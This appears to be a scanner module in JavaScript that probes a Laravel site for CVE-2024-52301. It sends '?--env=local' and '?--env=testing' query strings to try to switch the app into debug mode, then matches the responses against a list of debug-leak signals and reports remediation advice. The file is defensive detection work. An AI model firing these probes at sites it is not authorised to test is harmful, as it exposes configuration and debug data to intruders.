export const tags = ['laravel', 'all'];

/**
 * CVE-2024-52301 — Laravel Environment Manipulation (CVSS 8.7)
 *
 * When PHP's `register_argc_argv` directive is enabled (default in many
 * PHP builds), Laravel's environment bootstrapper reads `$_SERVER['argv']`
 * populated from the query string. An attacker appending `?--env=local`
 * can switch the running environment from "production" to "local",
 * potentially enabling debug mode, verbose stack traces, and configuration
 * exposure.
 *
 * Fixed in Laravel 11.31.0, 10.48.23, 9.52.17, 8.83.28, 7.30.7, 6.20.45
 *
 * Detection:
 *   1. Baseline GET to homepage — record status + body fingerprint
 *   2. Attack GET with ?--env=local — check for debug indicators
 *   3. Compare: new debug output = vulnerable
 */

// Strings that indicate debug mode / env leak
const DEBUG_SIGNALS = [
  'whoops',
  'app_env',
  'app_debug',
  'stack trace',
  'vendor/laravel',
  'vendor/symfony',
  '#0 ',            // PHP stack frame numbering
  'environment: local',
  'environment: testing',
  'illuminate\\',
  'illuminate/',
];

export default async function run(target, fetchWithRetry) {
  let baselineBody   = '';
  let baselineStatus = 0;

  // ── Step 1: Baseline ──────────────────────────────────────────────────────
  try {
    const res  = await fetchWithRetry(target);
    baselineStatus = res.status;
    baselineBody   = res.text.toLowerCase();
  } catch (e) {
    return { name: 'laravel env manipulation (CVE-2024-52301)', status: 'ERROR', severity: 'LOW', reason: e.message };
  }

  // ── Step 2: Probe with --env=local ────────────────────────────────────────
  for (const envFlag of ['?--env=local', '?--env=testing']) {
    try {
      const url = target.replace(/\/+$/, '') + '/' + envFlag.replace(/^\?/, '?');
      const res = await fetchWithRetry(url);
      const body    = res.text.toLowerCase();
      const status  = res.status;

      // Check for new debug signals that weren't in the baseline
      const newSignals = DEBUG_SIGNALS.filter(s =>
        body.includes(s) && !baselineBody.includes(s)
      );

      if (newSignals.length > 0) {
        return {
          name    : 'laravel env manipulation (CVE-2024-52301)',
          status  : 'VULNERABLE',
          severity: 'HIGH',
          detail  : `Environment switched to "${envFlag.replace('?--env=', '')}" — debug output leaked: ${newSignals[0]}`,
          fix     : "Update Laravel to a patched version (11.31.0+, 10.48.23+, 9.52.17+, 8.83.28+, 7.30.7+, or 6.20.45+) and disable 'register_argc_argv' in your php.ini.",
          payload : envFlag,
          signals : newSignals,
          cve     : 'CVE-2024-52301'
        };
      }

      // Status code changed significantly (e.g., 200 → 500) — suspicious
      if (status !== baselineStatus &&
          ((baselineStatus >= 200 && baselineStatus < 300) && status >= 500)) {
        return {
          name    : 'laravel env manipulation (CVE-2024-52301)',
          status  : 'SUSPICIOUS',
          severity: 'MEDIUM',
          detail  : `HTTP status changed from ${baselineStatus} to ${status} with ${envFlag} — register_argc_argv may be enabled`,
          fix     : "Disable 'register_argc_argv' in your php.ini to prevent environment manipulation via query string arguments.",
          payload : envFlag,
          cve     : 'CVE-2024-52301'
        };
      }

    } catch { /* skip this payload */ }
  }

  return {
    name   : 'laravel env manipulation (CVE-2024-52301)',
    status : 'SAFE',
    severity: 'NONE',
    detail  : 'No environment manipulation detected — likely patched or register_argc_argv disabled'
  };
}
